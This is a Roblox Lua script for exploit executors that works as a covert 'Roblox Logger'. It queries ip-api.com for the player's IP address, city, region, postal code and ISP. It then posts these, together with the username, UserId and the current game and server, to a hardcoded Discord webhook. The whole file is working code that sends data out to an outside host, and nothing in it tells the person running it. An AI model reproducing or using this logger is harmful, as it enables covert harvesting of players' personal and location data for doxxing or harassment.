local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Detect supported request function
local requestFunc = http_request or syn and syn.request or fluxus and fluxus.request
if not requestFunc then
    warn("Your executor does not support HTTP requests.")
    return
end

-- Get IP/location info
local ipData
pcall(function()
    local response = requestFunc({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    ipData = HttpService:JSONDecode(response.Body)
end)

-- Fallback if no IP data
ipData = ipData or {
    query = "Unavailable",
    city = "Unavailable",
    country = "Unavailable",
    isp = "Unavailable",
    zip = "Unavailable",
    regionName = "Unavailable"
}

-- Build webhook embed
local data = {
    ["username"] = "Roblox Logger",
    ["embeds"] = {{
        ["title"] = "New Execution Logged",
        ["color"] = 0x00FFFF,
        ["fields"] = {
            {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
            {["name"] = "DisplayName", ["value"] = player.DisplayName, ["inline"] = true},
            {["name"] = "Executor", ["value"] = "Visual", ["inline"] = true},
            {["name"] = "Roblox Version", ["value"] = tostring(version()), ["inline"] = true},
            {["name"] = "Device Type", ["value"] = "PC", ["inline"] = true},
            {
                ["name"] = "Game",
                ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " (" .. game.PlaceId .. ")"
            },
            {
                ["name"] = "Game URL",
                ["value"] = "https://www.roblox.com/games/" .. game.PlaceId .. "?gameId=" .. game.JobId
            },
            {["name"] = "IP Address", ["value"] = ipData.query, ["inline"] = true},
            {["name"] = "Location", ["value"] = ipData.city .. ", " .. ipData.regionName .. ", " .. ipData.country, ["inline"] = true},
            {["name"] = "Postal Code", ["value"] = ipData.zip, ["inline"] = true},
            {["name"] = "ISP", ["value"] = ipData.isp, ["inline"] = true},
            {["name"] = "Time (UTC)", ["value"] = os.date("!%Y-%m-%d %H:%M:%S UTC"), ["inline"] = true},
            {["name"] = "Total Players", ["value"] = tostring(#Players:GetPlayers()), ["inline"] = true},
            {["name"] = "Fingerprint", ["value"] = tostring(math.random(1000000000, 4294967295)), ["inline"] = true}
        }
    }}
}

-- Send to webhook
local jsonData = HttpService:JSONEncode(data)
requestFunc({
    Url = "https://discord.com/api/webhooks/1376958804352303254/KYgS7hVoLDpUo6BMHnpn8EmCbMgsg2s4bqXZFMp0Mw1ZaF7JO5xtXCFLGT34784PGnYV", -- Replace this!
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = jsonData
})
